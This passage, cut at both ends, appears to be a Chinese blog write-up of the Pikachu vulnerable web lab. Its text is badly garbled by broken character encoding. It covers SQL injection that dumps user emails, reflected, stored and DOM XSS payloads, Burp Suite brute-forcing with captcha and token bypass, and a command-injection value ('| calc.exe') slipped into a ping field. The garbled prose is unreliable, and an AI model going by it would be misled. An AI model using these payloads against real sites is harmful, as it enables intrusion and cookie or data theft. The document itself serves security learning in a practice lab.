= ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</p></blockquote><p><img src="https://img2018.cnblogs.com/blog/1335588/201903/1335588-20190323124156168-514841357.png" alt="img"></p><p><strong>è¿‡ç¨‹</strong></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%df&#x27; or 1=1 %23+&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰æ•°æ®è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your uid:1your email is: eyour uid:2your email is: allen@pikachu.comyour uid:3your email is: kobe@pikachu.comyour uid:4your email is: grady@pikachu.comyour uid:5your email is: kevin@pikachu.comyour uid:6your email is: lucy@pikachu.com......</span><br></pre></td></tr></table></figure><hr><h1 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h1><blockquote><p>XSS æ¼æ´å¯ä»¥ç”¨æ¥è¿›è¡Œé’“é±¼æ”»å‡»ï¼Œå‰ç«¯ JS æŒ–çŸ¿ï¼Œç”¨æˆ· cookie è·å–ã€‚ç”šè‡³å¯ä»¥ç»“åˆæµè§ˆå™¨è‡ªèº«çš„æ¼æ´å¯¹ç”¨æˆ·ä¸»æœºè¿›è¡Œè¿œç¨‹æ§åˆ¶ã€‚</p></blockquote><h2 id="åå°„å‹xssget"><a class="markdownIt-Anchor" href="#åå°„å‹xssget">#</a> åå°„å‹ xss (get)</h2><h3 id="è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹">#</a> è¿‡ç¨‹</h3><p>â€‹æ–‡æœ¬æ¡†ä¸‹æ–¹ä¼šå›æ˜¾è¾“å…¥çš„å†…å®¹ï¼Œæƒ³è¾“ä¸‡èƒ½å¼¹çª— <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> ï¼Œå‘ç°æ–‡æœ¬æ¡†é™åˆ¶äº†å­—æ•°ï¼Œå‰ç«¯ç›´æ¥å®šä½æ”¹æˆ 100ï¼ŒæˆåŠŸ</p><p><img src="pikachu-xss-001.png" alt=""></p><p>å› ä¸ºä¸º get è¯·æ±‚ï¼Œæ‰€ä»¥è¾“å…¥çš„å‚æ•°å€¼ä¼šå‡ºç°åœ¨ url æœ«å°¾</p><hr><h2 id="åå°„å‹xsspostå¤§å¤±è´¥"><a class="markdownIt-Anchor" href="#åå°„å‹xsspostå¤§å¤±è´¥">#</a> åå°„å‹ xss (post)ï¼ˆå¤§å¤±è´¥ï¼‰</h2><p><img src="pikachu-xss-002.png" alt=""></p><p>â€‹POST è¯·æ±‚åŒºåˆ«ä¸ GET è¯·æ±‚ï¼ŒPOST è¯·æ±‚ä¸èƒ½ä» URL è®©ç”¨æˆ·å‘æœåŠ¡å™¨æäº¤æ•°æ®ã€‚æ‰€ä»¥ä¸ºäº†è¿›è¡Œæ³¨å…¥ï¼Œéœ€è¦è®©ç”¨æˆ·ä»£æ›¿æ”»å‡»è€…æäº¤ POST è¯·æ±‚ï¼Œè¿™å°±éœ€è¦æ”»å‡»è€…è‡ªå·±æ­å»ºç«™ç‚¹ï¼Œç„¶åå†ç«™ç‚¹å†…å†™ä¸€ä¸ª POST è¡¨å•ï¼Œå°†æˆ‘ä»¬æ­å»ºå‡ºçš„è¿æ¥å‘ç»™ç”¨æˆ·ï¼Œè¿™æ ·å°±èƒ½è®©ç”¨æˆ·å¸®æ”»å‡»è€…æäº¤ POST è¯·æ±‚å‘ç»™å­˜åœ¨ XSS æ¼æ´çš„ä¸­ã€‚è¿™æ ·å°±èƒ½çªƒå–åˆ°ç”¨æˆ·çš„ cookieï¼Œå°±èƒ½ä¼ªé€ ç”¨æˆ·ç™»é™†è¾¾åˆ°ç ´åçš„ç›®çš„ã€‚</p><h3 id="è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-2">#</a> è¿‡ç¨‹</h3><p>ä½†æ˜¯è¿™åå°æˆ‘æ²¡ç™»è¿›å»å‘€ï½</p><hr><h2 id="å­˜å‚¨å‹xss"><a class="markdownIt-Anchor" href="#å­˜å‚¨å‹xss">#</a> å­˜å‚¨å‹ xss</h2><h3 id="è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-3">#</a> è¿‡ç¨‹</h3><p>â€‹ç›´æ¥æä¸ªè¶…é“¾æ¥ï¼Œç•™è¨€åˆ—è¡¨ç‚¹å‡»è·³è½¬</p><p><img src="pikachu-xss-003.png" alt=""></p><script>alert(1)</script> çš„è¯ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šå¼¹çª—<hr><h2 id="domå‹"><a class="markdownIt-Anchor" href="#domå‹">#</a> dom å‹</h2><p>click ä¸€ä¸‹ï¼Œå‘ç°è¶…é“¾æ¥çš„è·³è½¬æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç›´æ¥é—­åˆå°±å¯</p><h3 id="è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-4">#</a> è¿‡ç¨‹</h3><p><img src="pikachu-xss-004.png" alt=""></p><p>å°è¯•ç”¨åŒå¼•å·é—­åˆçš„æ—¶å€™ï¼Œå°½ç„¶æ²¡æœ‰ä½œç”¨ï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&quot;&gt;nhhh<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#</span></span></span><br></pre></td></tr></table></figure><p><img src="pikachu-xss-005.png" alt=""></p><p>å…¨éƒ¨æ”¹æˆå•å¼•å· <code>a'&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code> ï¼š</p><p><img src="pikachu-xss-006.png" alt=""></p><p>ä½†æ˜¯ js è„šæœ¬æ²¡æœ‰ç”Ÿæ•ˆï¼Œå› ä¸ºæ²¡æœ‰è¿”å›ç»™æœåŠ¡å™¨ï¼Œæ‰€ä»¥åˆ·æ–°ä¹‹åæ›´æ”¹çš„ä¹Ÿæ²¡æœ‰äº†ï¼Œå¯ä»¥é€šè¿‡ onclick å¼¹çª—:</p><p><code>a' onclick=&quot;alert(1)&quot;&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code></p><p><img src="pikachu-xss-007.png" alt=""></p><hr><h2 id="domå‹xss-x"><a class="markdownIt-Anchor" href="#domå‹xss-x">#</a> dom å‹ xss-x</h2><h3 id="è¿‡ç¨‹-5"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-5">#</a> è¿‡ç¨‹</h3><p>éšä¾¿è¾“å…¥ a åç‚¹æŒ‰é’®ï¼Œå‡ºç°ä¸€ä¸ªè¶…é“¾æ¥ï¼Œå‘ç°è¿™ä¸ªè¶…é“¾æ¥æœ‰ä¸€ä¸ªäº‹ä»¶ï¼Œè°ƒç”¨äº† domxss () å‡½æ•°ï¼ŒCtrl+F æ‰¾ä¸€ä¸‹ domxss çœ‹ js æºä»£ç ï¼Œç«Ÿç„¶è¿˜æœ‰è¿™ç§æ˜ç¤º</p><p><img src="pikachu-xss-008.png" alt=""></p><p>ç›´æ¥è¾“å…¥ï¼šâ€™ onclick=â€œalert (â€˜xssâ€™)â€&gt;</p><p><img src="pikachu-xss-009.png" alt=""></p><hr><h2 id="xssä¹‹ç›²æ‰“"><a class="markdownIt-Anchor" href="#xssä¹‹ç›²æ‰“">#</a> xss ä¹‹ç›²æ‰“</h2><h3 id="è¿‡ç¨‹-6"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-6">#</a> è¿‡ç¨‹</h3><p>æ ¹æ®æç¤ºç™»å½•åå°ï¼Œå‘ç°æœ‰æˆ‘ä»¬æäº¤çš„æ•°æ®ï¼ˆè¿™é‡Œåªèƒ½æ˜¾ç¤ºä¸€ä¸ªæˆ‘ä»¬äº¤çš„æ•°æ®ï¼æ°”äººï¼‰ï¼Œæ‰€ä»¥å‰å°æäº¤</p><figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åå°å°±ä¼šè¢«å¼¹</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·å– cookieï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ²¡æœ‰è¯•</p><p>(çˆ±é¸­ï¼Œæ€ä¹ˆèƒ½ä¸è¯•è¯•å‘¢ï½)</p><hr><h2 id="xssä¹‹è¿‡æ»¤"><a class="markdownIt-Anchor" href="#xssä¹‹è¿‡æ»¤">#</a> xss ä¹‹è¿‡æ»¤</h2><h3 id="è¿‡ç¨‹-7"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-7">#</a> è¿‡ç¨‹</h3><p>ç»è¿‡å¤šæ¬¡å°è¯•ï¼Œåº”æ˜¯è¿‡æ»¤äº† &lt; script å’Œå‰é¢æ‰€æœ‰å­—ç¬¦ï¼Œå¤§å°å†™å¯ä»¥ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨<a onclick="alert(1)"></a></p><hr><h2 id="xssä¹‹htmlspecialcahrsæˆ‘æ€»æ˜¯ä»¥ä¸ºè‡ªå·±æ²¡ç»•è¿‡"><a class="markdownIt-Anchor" href="#xssä¹‹htmlspecialcahrsæˆ‘æ€»æ˜¯ä»¥ä¸ºè‡ªå·±æ²¡ç»•è¿‡">#</a> xss ä¹‹ htmlspecialcahrsï¼Œæˆ‘æ€»æ˜¯ä»¥ä¸ºè‡ªå·±æ²¡ç»•è¿‡</h2><h3 id="è¿‡ç¨‹-8"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-8">#</a> è¿‡ç¨‹</h3><p>é»˜è®¤ä¸è¿‡æ»¤å•å¼•å·</p><p>payloadï¼š</p><figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure><hr><h2 id="xssä¹‹hrefè¾“å‡º"><a class="markdownIt-Anchor" href="#xssä¹‹hrefè¾“å‡º">#</a> xss ä¹‹ href è¾“å‡º</h2><h3 id="è¿‡ç¨‹-9"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-9">#</a> è¿‡ç¨‹</h3><p>payload:</p><figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p><img src="pikachu-xss-011.png" alt=""></p><hr><h2 id="xssä¹‹jsè¾“å‡º"><a class="markdownIt-Anchor" href="#xssä¹‹jsè¾“å‡º">#</a> xss ä¹‹ js è¾“å‡º</h2><h3 id="è¿‡ç¨‹-10"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-10">#</a> è¿‡ç¨‹</h3><p>çœ‹è¡¨å•å‘ç° js æœ‰ä¸ªåˆ¤æ–­ï¼Œè¾“å…¥ tmac ä¼šè¾“å‡ºä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥æ’å…¥ onclick=â€œalert (1)â€</p><p><img src="pikachu-xss-012.png" alt=""></p><p><img src="pikachu-xss-010.png" alt=""></p><p>æ®è¯´å¯ä»¥é—­åˆï¼ŒæˆåŠŸå¼¹çª—</p><p>payloadï¼š</p><figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é—­åˆåçš„ jsï¼š</p><p><img src="pikachu-xss-013.png" alt=""></p><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“">#</a> æ€»ç»“</h2><p><a href="https://blog.csdn.net/weixin_43899561/article/details/89429726">å¤§ä½¬å†™çš„å…³äº xss æŠ“ cookie</a></p><p><a href="https://www.fujieace.com/penetration-test/xss-100.html">XSS è¿‡æ»¤ç»•è¿‡æ–¹æ³•</a></p><p><a href="https://www.cnblogs.com/heiwa-0924/p/12520547.html">é€šå…³æ‰‹å†Œï¼Œå†™å¾—æŒºå¥½</a></p><hr><h1 id="æ–‡ä»¶åŒ…å«"><a class="markdownIt-Anchor" href="#æ–‡ä»¶åŒ…å«">#</a> æ–‡ä»¶åŒ…å«</h1><p>æ–‡ä»¶åŒ…å«ä¹‹çœ‹ä¸æ‡‚è‡ªå·±åœ¨å†™ä»€ä¹ˆï¼Œæ‰€ä»¥æ— æ³•ä¸Šä¼ ç³»åˆ—</p><p>çœ‹æ ·å­åº”è¯¥å°±æ˜¯åŸºç¡€çš„æ–‡ä»¶åŒ…å«é¸­ï½</p><h2 id="æ€»ç»“-2"><a class="markdownIt-Anchor" href="#æ€»ç»“-2">#</a> æ€»ç»“ï¼š</h2><p>æ–‡ä»¶åŒ…å«ï¼š</p><blockquote><p>æ–‡ä»¶åŒ…å«åœ¨ php ä¸­ï¼Œæ¶‰åŠåˆ°çš„å±é™©å‡½æ•°æœ‰å››ä¸ªï¼Œåˆ†åˆ«æ˜¯ include ()ã€include_once ()ã€require ()ã€require_once ()ã€‚</p></blockquote><p>åŒºåˆ«å¦‚ä¸‹ï¼š</p><blockquote><p>includeï¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å‘ç”Ÿé”™è¯¯æ—¶ï¼Œç¨‹åºè­¦å‘Šï¼Œä½†ä¼šç»§ç»­æ‰§è¡Œã€‚</p><p>include_onceï¼šå’Œ include ç±»ä¼¼ï¼Œä¸åŒå¤„åœ¨äº include_once ä¼šæ£€æŸ¥è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å·²ç»è¢«å¯¼å…¥ï¼Œå¦‚æœå·²å¯¼å…¥ï¼Œä¸‹æ–‡ä¾¿ä¸ä¼šå†å¯¼å…¥ï¼Œç›´é¢ once ç†è§£å°±æ˜¯åªå¯¼å…¥ä¸€æ¬¡ã€‚</p><p>requireï¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼ŒåŒ…å«æ–‡ä»¶å‘ç”Ÿé”™è¯¯æ—¶ï¼Œç¨‹åºç›´æ¥ç»ˆæ­¢æ‰§è¡Œã€‚</p><p>require_onceï¼šå’Œ require ç±»ä¼¼ï¼Œä¸åŒå¤„åœ¨äº require_once åªå¯¼å…¥ä¸€æ¬¡ã€‚</p></blockquote><hr><h1 id="æš´åŠ›ç ´è§£"><a class="markdownIt-Anchor" href="#æš´åŠ›ç ´è§£">#</a> æš´åŠ›ç ´è§£</h1><h2 id="åŸºäºè¡¨å•çš„çˆ†ç ´"><a class="markdownIt-Anchor" href="#åŸºäºè¡¨å•çš„çˆ†ç ´">#</a> åŸºäºè¡¨å•çš„çˆ†ç ´</h2><h3 id="è¿‡ç¨‹-11"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-11">#</a> è¿‡ç¨‹</h3><p>â€‹bp æŠ“åŒ…ï¼Œintrude ç›´æ¥çˆ†å¯†ç ï¼Œç”¨æˆ·å adminã€‚</p><p>â€‹æ ¹æ®æç¤ºï¼Œå‘ç°æœ‰ä¸‰ä¸ªè´¦å·ï¼š</p><ul><li>admin</li><li>pikachu</li><li>test</li></ul><p>å‰ä¸¤ä¸ªåº”è¯¥ç›´æ¥çŒœåˆ°çš„ï¼Œæœ€åä¸€ä¸ªè¿˜æ²¡è§è¿‡ï¼Œä¸è¿‡æ¶¨å§¿åŠ¿äº†ï¼Œåº”è¯¥éƒ½æ˜¯å¸¸ç”¨è´¦æˆ·åã€‚</p><p>æƒ³äº†æƒ³ï¼Œç”¨ bp åŒæ—¶çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼ˆå°±æ˜¯é€Ÿåº¦å¤ªæ…¢äº†ï¼‰ï¼š</p><p><img src="pikachu-baopo-003.png" alt="pikachu-baopo-003"></p><p>pitchfork ä¹Ÿå¯ä»¥å•Š</p><p><img src="pikachu-baopo-001.png" alt="pikachu-baopo-001"></p><p>è¿™æ˜¯ç»™ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®å­—å…¸ï¼Œä½ è¿™ä¸ªçŒª<img src="pikachu-baopo-002.png" alt="pikachu-baopo-002"></p><h2 id="éªŒè¯ç ç»•è¿‡on-server"><a class="markdownIt-Anchor" href="#éªŒè¯ç ç»•è¿‡on-server">#</a> éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h2><h3 id="è¿‡ç¨‹-12"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-12">#</a> è¿‡ç¨‹</h3><p>çœ‹æŠ“çš„åŒ…ï¼Œå‘ç°æŠŠç”¨æˆ·è¾“å…¥çš„éªŒè¯ç å’Œç”¨æˆ·åå¯†ç ä¸€èµ·å‘åˆ°æœåŠ¡å™¨äº†ï¼Œè€Œä¸”åœ¨ cookie é‡Œå‘ç°äº†éªŒè¯ç çš„å€¼ï¼Œæ‰€ä»¥åˆ¤æ–­æ˜¯éªŒè¯ç ç»•è¿‡ã€‚</p><p><img src="pikachu-baopo-004.png" alt=""></p><p>åŸºæœ¬è¿‡ç¨‹ï¼šå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ -&gt; æœåŠ¡ç«¯å“åº”å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ SessionID åŒæ—¶ç”ŸæˆéšæœºéªŒè¯ç ï¼Œå°†éªŒè¯ç å’Œ SessionID ä¸€å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ -&gt; å®¢æˆ·ç«¯æäº¤éªŒè¯ç è¿åŒ SessionID ç»™æœåŠ¡ç«¯ -&gt; æœåŠ¡ç«¯éªŒè¯éªŒè¯ç åŒæ—¶é”€æ¯å½“å‰ä¼šè¯ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ç»“æœã€‚</p><p>æ‰€ä»¥ç”¨ bp æ‹¦æˆªï¼Œä¸è®©é¡µé¢åˆ·æ–°ï¼Œå°±ä¸ä¼šé”€æ¯ä¼šè¯ï¼Œä¹Ÿä¸ä¼šæ›´æ–°éªŒè¯ç ï¼Œå°±å¯ä»¥ç”¨ bp çˆ†ç ´è¾£ï¼Œåœ¨ cookie ä¸­å¸¦å›ºå®šçš„ sessionID å’Œå›ºå®šçš„éªŒè¯ç å­—ç¬¦ä¸²</p><p><img src="pikachu-baopo-005.png" alt=""></p><h2 id="éªŒè¯ç ç»•è¿‡on-client"><a class="markdownIt-Anchor" href="#éªŒè¯ç ç»•è¿‡on-client">#</a> éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰</h2><h3 id="è¿‡ç¨‹-13"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-13">#</a> è¿‡ç¨‹</h3><p>åœ¨å‰å°æ‰¾åˆ°äº†éªŒè¯éªŒè¯ç çš„å‡½æ•°</p><p><img src="pikachu-baopo-006.png" alt=""></p><p>é€šè¿‡æœç´¢å‡½æ•°åï¼Œå®šä½æ‰§è¡Œå‡½æ•°çš„ä½ç½®ï¼ŒæŠŠè¿™ä¸ªäº‹ä»¶åˆ æ‰ï¼Œbp æŠ“åŒ…ï¼Œå‘ç°æœ‰ vcode å‚æ•°ï¼Œåˆ æ‰åˆ æ‰ï¼Œç›´æ¥çˆ†ç ´</p><p>å†™å®Œ token å‘ç°ä¹Ÿå¯è‡ªåŠ¨åŒ–è·å–å‰ç«¯ä¿¡æ¯ï¼Œè¿›è¡Œçˆ†ç ´</p><h2 id="tokené˜²çˆ†"><a class="markdownIt-Anchor" href="#tokené˜²çˆ†">#</a> token é˜²çˆ†</h2><h3 id="è¿‡ç¨‹-14"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-14">#</a> è¿‡ç¨‹</h3><p>token ä¸»è¦ç”¨æ¥é˜²å¾¡ csrfï¼Œè€Œæ— æ³•é˜²æ­¢æš´åŠ›ç ´è§£ã€‚</p><p>è¿™æ˜¯å› ä¸ºå°†ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ token åŠ å…¥è¯·æ±‚ä¹‹åï¼Œæ¯æ¬¡è¯·æ±‚ token éƒ½ä¼šæ”¹å˜ã€‚</p><p>csrf æ”»å‡»è€…åªèƒ½çªƒå–å—å®³è€…çš„ cookie å´ä¸èƒ½ä¼ªé€ å½“æ¬¡è¯·æ±‚çš„ tokenï¼Œtoken æ— æ³•é˜²æ­¢æš´åŠ›ç ´è§£çš„åŸå› æ˜¯ token æ¯æ¬¡éƒ½ä¼šéšé¡µé¢è¿”å›åˆ°å‰ç«¯ï¼Œæ”»å‡»è€…åªè¦æƒ³åŠæ³•__è‡ªåŠ¨åŒ–è·å¾—å‰ç«¯çš„ token__å³å¯è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»ã€‚</p><p>option ä¸­çš„ Grep -Extract: è¿™ä¸ªè®¾ç½®èƒ½å¤Ÿè¢«ç”¨æ¥é€šè¿‡è¯·æ±‚è¿”å›çš„ä¿¡æ¯æ¥è·å–æœ‰ç”¨çš„ä¿¡æ¯ä¾›ä½ ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è·å¾—æ¯æ¬¡è¯·æ±‚åè¿”å›çš„ tokenï¼Œå…³è”åˆ° payload ä¸­è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p><p><img src="pikachu-baopo-007.png" alt=""></p><p>è¿™æ ·å°±è®¾ç½®å®Œæ¯•äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ burp çš„ Pichfork çˆ†ç ´æ¨¡å¼åªèƒ½è¿›è¡Œå•çº¿ç¨‹çš„çˆ†ç ´ï¼Œè®¾ç½®ä¸€ä¸‹çº¿ç¨‹ 1</p><p><img src="pikachu-baopo-008.png" alt=""></p><p><img src="pikachu-baopo-009.png" alt=""></p><p><img src="pikachu-baopo-010.png" alt=""></p><p>ç„¶åå¸¸è§„çˆ†ç ´å°±å¥½äº†</p><h2 id="æ€»ç»“-3"><a class="markdownIt-Anchor" href="#æ€»ç»“-3">#</a> æ€»ç»“</h2><p><strong>BurpSuite intruder attack-type 4 ç§çˆ†ç ´æ¨¡å¼ï¼š</strong></p><p>Sniper å•å‚æ•°çˆ†ç ´ï¼Œå¤šå‚æ•°æ—¶åŒä¸€ä¸ªå­—å…¸æŒ‰é¡ºåºæ›¿æ¢å„å‚æ•°ï¼Œæ€»ä¹‹åˆå§‹å€¼æœ‰ä¸€ä¸ªå‚æ•°ä¸å˜</p><p>Battering ram å¤šå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½†ç”¨çš„æ˜¯åŒä¸€ä¸ªå­—å…¸</p><p>Pichfork å¤šå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½†ç”¨çš„æ˜¯ä¸åŒçš„å­—å…¸</p><p>Cluster bamb å¤šå‚æ•°åšç¬›å¡å°”ä¹˜ç§¯æ¨¡å¼çˆ†ç ´</p><p><a href="https://www.cnblogs.com/kllay/p/7136022.html">bp çˆ†ç ´å„ç§ç±»å‹è§£è¯´</a></p><p><a href="https://www.cnblogs.com/rnss/p/11233006.html">token çœ‹çš„è¿™ä½å¤§ä½¬</a></p><hr><h1 id="rce"><a class="markdownIt-Anchor" href="#rce">#</a> RCE</h1><p><strong>æ¼æ´æ¦‚è¿°</strong></p><blockquote><p>RCEï¼ˆremote command/code executeï¼‰æ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p><p>(æ¬ä¸€ä¸‹çš®å¡ä¸˜å“’ï¼Œå¯¹è¿™ä¸ªä¸æ˜¯å¾ˆç†Ÿæ‚‰)</p></blockquote><p><strong>è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</strong></p><blockquote><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£<br>æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„ web ç®¡ç†ç•Œé¢ä¸Š</p><p>ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ª ping æ“ä½œçš„ web ç•Œé¢ï¼Œç”¨æˆ·ä» web ç•Œé¢è¾“å…¥ç›®æ ‡ IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥ IP åœ°å€è¿›è¡Œä¸€æ¬¡ ping æµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤ â€œæ„æƒ³ä¸åˆ°â€ çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨</p><p>ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´ï¼Œå¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡ &quot;è‡ªåŠ¨åŒ–è¿ç»´å¹³å°&quot; è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼Œä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ &quot;æ”¶è·&quot;-_-</p></blockquote><p><strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong></p><blockquote><p>åŒæ ·çš„é“ç†ï¼Œå› ä¸ºéœ€æ±‚è®¾è®¡ï¼Œåå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œï¼Œä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„ API æ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p><p>ä½ å¯ä»¥é€šè¿‡ â€œRCEâ€ å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</p></blockquote><h2 id="exec-ping"><a class="markdownIt-Anchor" href="#exec-ping">#</a> exec â€œpingâ€</h2><h3 id="è¿‡ç¨‹-15"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-15">#</a> è¿‡ç¨‹</h3><p>post æ–¹æ³•ï¼Œç”¨ç«ç‹æ‹¦æˆªé‡å‘ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipaddress=jsdlvfdsfger | C:\Windows\System32\calc.exe&amp;submit=ping</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡º</p><h2 id="execeval"><a class="markdownIt-Anchor" 